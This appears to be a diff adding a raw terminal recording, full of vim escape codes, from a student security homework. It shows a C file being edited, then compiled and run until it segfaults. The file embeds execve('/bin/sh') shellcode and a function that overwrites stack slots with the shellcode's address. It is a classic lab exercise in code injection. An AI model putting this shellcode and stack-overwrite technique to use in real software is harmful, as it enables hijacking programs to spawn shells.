@@ -1,0 +1,59 @@
+Script started on Fri 06 Apr 2018 09:23:47 PM EDT
+]0;ameya05@js-157-98: ~/git/security-hw3ameya05@js-157-98:~/git/security-hw3$ vim part3a.c
+[?1049h[?1h=[2;1H▽[6n[1;1H  [1;1H[1;14r[?12;25h[?12l[?25h[27m[m[H[2J[?25l[14;1H"part3a.c" 73L, 1196C[>c[1;1H[35m#include [m[31m<unistd.h>[m
+[35m#include [m[31m<signal.h>[m
+[35m#include [m[31m<stdlib.h>[m
+[35m#include [m[31m<malloc.h>[m
+[35m#include [m[31m<sys/mman.h>[m
+[35m#include [m[31m<string.h>[m
+[35m#include [m[31m<errno.h>[m
+
+[32mlong[m [32mlong[m  *hold;
+[32mchar[m shellcode[] =
+[31m"[m[35m\xeb\x18\x48\x31\xc0\x04\x0b\x5b\x48\x31\xc9[m[31m"
+"[m[35m\x48\x31\xd2\xcd\x80\x48\x31\xc0\x48\x31\xdb[m[31m"
+"[m[35m\xb0\x01\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69[m[31m"[m[14;63H1,1[11CTop[1;1H[?12l[?25hP+q436f\P+q6b75\P+q6b64\P+q6b72\P+q6b6c\P+q2332\P+q2334\P+q2569\P+q2a37\P+q6b31\[?25l[14;63H2[2;1H[?12l[?25h[?25l[14;63H3[3;1H[?12l[?25h[?25l[14;63H4[4;1H[?12l[?25h[?25l[14;63H5[5;1H[?12l[?25h[?25l[14;63H6[6;1H[?12l[?25h[?25l[14;63H7[7;1H[?12l[?25h[?25l[14;63H8,0-1[8;1H[?12l[?25h[?25l[14;63H9,1  [9;1H[?12l[?25h[?25l[14;63H10,1[10;1H[?12l[?25h[?25l[14;64H1[11;1H[?12l[?25h[?25l[14;64H2[12;1H[?12l[?25h[?25l[14;64H3[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;1H[31m"[m[35m\x6e\x2f\x73\x68\x00[m[31m"[m;[14;1H[K[14;63H14,1[11C1%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[14;63H[K[14;63H15,0-1[9C3%[13;1H[?12l[?25h[?25l[1;13r[1;1H[2M[1;14r[12;3H[34m//Replace the above shellcode buffer of NOP operations with the hex code for yy[13;1Hou shell code.[m[14;63H[K[14;63H16,1[11C6%[12;1H[?12l[?25h[?25l[1;13r[1;1H[2M[1;14r[12;3H[34m//NOTE: Make sure it is null terminated, but otherwise has no NULL characters  [13;1Hembedded.[m[14;63H[K[14;63H17,1[11C9%[12;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[14;63H[K[14;63H18,0-1[8C11%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;1H[32mvoid[m decoy([32mchar[m *cx)[14;63H[K[14;63H19,1[10C12%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[14;63H[K[14;63H20,0-1[8C14%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;1H{[14;63H[K[14;63H21,1[10C16%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;2H[32mlong[m [32mlong[m *ret;[14;63H[K[14;63H22,1[10C17%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[14;63H[K[14;63H23,1[10C19%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;2Hhold= ([32mlong[m [32mlong[m *)&ret;[14;63H[K[14;63H24,1[10C20%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;2H(*hold)=([32mlong[m [32mlong[m)cx;[14;63H[K[14;63H25,1[10C22%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3Hhold++;[14;63H[K[14;63H26,1[10C24%[13;1H[?12l[?25h[?25l[1;13r[1;1H[2M[1;14r[12;3H(*hold)=([32mlong[m [32mlong[m)cx;
+  hold++;[14;63H[K[14;63H27,1[10C26%[12;1H[?12l[?25h[?25l[14;64H8[13;1H[?12l[?25h[?25l[1;13r[1;1H[2M[1;14r[12;3H(*hold)=([32mlong[m [32mlong[m)cx;
+  hold++;[14;63H[K[14;63H29,1[10C28%[12;1H[?12l[?25h[?25l[14;63H30[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3H(*hold)=([32mlong[m [32mlong[m)cx;[14;63H[K[14;63H31,1[10C30%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;2Hhold++;[14;63H[K[14;63H32,1[10C31%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3H(*hold)=([32mlong[m [32mlong[m)cx;[14;63H[K[14;63H33,1[10C33%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;2Hhold++;[14;63H[K[14;63H34,1[10C35%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3H(*hold)=([32mlong[m [32mlong[m)cx;[14;63H[K[14;63H35,1[10C36%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[14;63H[K[14;63H36,0-1[8C38%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;1H}[14;63H[K[14;63H37,1[10C40%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[14;63H[K[14;63H38,0-1[8C41%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;1H[32mvoid[m main ()[14;63H[K[14;63H39,1[10C43%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;1H{[14;63H[K[14;63H40,1[10C45%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3H[32mint[m pagesize;[14;63H[K[14;63H41,1[10C46%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3H[32mchar[m *buf;[14;63H[K[14;63H42,1[10C48%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[14;63H[K[14;63H43,1[10C50%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3Hpagesize = sysconf(_SC_PAGE_SIZE);[14;63H[K[14;63H44,1[10C51%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3Hposix_memalign(&buf, pagesize, strlen(shellcode)+[31m10[m);[14;63H[K[14;63H45,1[10C53%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3Hstrcpy(buf,shellcode);[14;63H[K[14;63H46,1[10C55%[13;1H[?12l[?25h[?25l[1;13r[13;1H
+[1;14r[13;3Hmprotect(buf, strlen(shellcode)+[31m10[m, PROT_EXEC|PROT_WRITE|PROT_READ);[14;63H[K[14;63H47,1[10C56%[13;1H[?12l[?25h[?25l[14;64H6[12;1H[?12l[?25h[?25l[14;64H5[11;1H[?12l[?25h[?25l[14;66H2[11;2H[?12l[?25h[?25l[14;64H6[12;2H[?12l[?25h[?25l[14;64H7[13;2H[?12l[?25h[?25l[14;66H3[13;3H[?12l[?25h[?25l
+[1m-- INSERT --[m[14;63H[K[14;63H47,3[10C56%[13;3H[?12l[?25h[?25l$mprotect(buf, strlen(shellcode)+[31m10[m, PROT_EXEC|PROT_WRITE|PROT_READ);[14;66H4[13;4H[?12l[?25h[?25lmprotect(buf, strlen(shellcode)+[31m10[m, PROT_EXEC|PROT_WRITE|PROT_READ);[13;71H[K[14;66H3[13;3H[?12l[?25h[?25l#mprotect(buf, strlen(shellcode)+[31m10[m, PROT_EXEC|PROT_WRITE|PROT_READ);[14;66H4[13;4H[?12l[?25h[?25l#mprotect(buf, strlen(shellcode)+[31m10[m, PROT_EXEC|PROT_WRITE|PROT_READ);[14;66H5[13;5H[?12l[?25h[?25lmprotect(buf, strlen(shellcode)+[31m10[m, PROT_EXEC|PROT_WRITE|PROT_READ);[13;72H[K[14;66H4[13;4H[?12l[?25h[?25lmprotect(buf, strlen(shellcode)+[31m10[m, PROT_EXEC|PROT_WRITE|PROT_READ);[13;71H[K[14;66H3[13;3H[?12l[?25h[?25l/mprotect(buf, strlen(shellcode)+[31m10[m, PROT_EXEC|PROT_WRITE|PROT_READ);[14;66H4[13;4H[?12l[?25h[?25l[34m//mprotect(buf, strlen(shellcode)+10, PROT_EXEC|PROT_WRITE|PROT_READ);[m[14;66H5[13;5H[?12l[?25h[14;1H[K[13;4H[?25l[14;63H47,4[10C56%[13;4H[?12l[?25h[?25l[14;63H[K[14;1H:[?12l[?25hw[?25l[?12l[?25hq[?25l[?12l[?25h![?25l[?12l[?25h[?25l"part3a.c" 73L, 1198C written
+[?1l>[?12l[?25h[?1049l]0;ameya05@js-157-98: ~/git/security-hw3ameya05@js-157-98:~/git/security-hw3$ vim part3a.c[8Pexitvim part3b.c[8@cp part3a.c[C[C[C[C[C[C[C[C[Cexit[K./part3agcc part3a.c -o part3a
+part3a.c: In function ‘main’:
+part3a.c:45:3: warning: passing argument 1 of ‘posix_memalign’ from incompatible pointer type [enabled by default]
+   posix_memalign(&buf, pagesize, strlen(shellcode)+10);
+   ^
+In file included from part3a.c:3:0:
+/usr/include/stdlib.h:503:12: note: expected ‘void **’ but argument is of type ‘char **’
+ extern int posix_memalign (void **__memptr, size_t __alignment, size_t __size)
+            ^
+]0;ameya05@js-157-98: ~/git/security-hw3ameya05@js-157-98:~/git/security-hw3$ ./part3a
+Segmentation fault (core dumped)
+]0;ameya05@js-157-98: ~/git/security-hw3ameya05@js-157-98:~/git/security-hw3$ exit
+Script done on Fri 06 Apr 2018 09:24:35 PM EDT
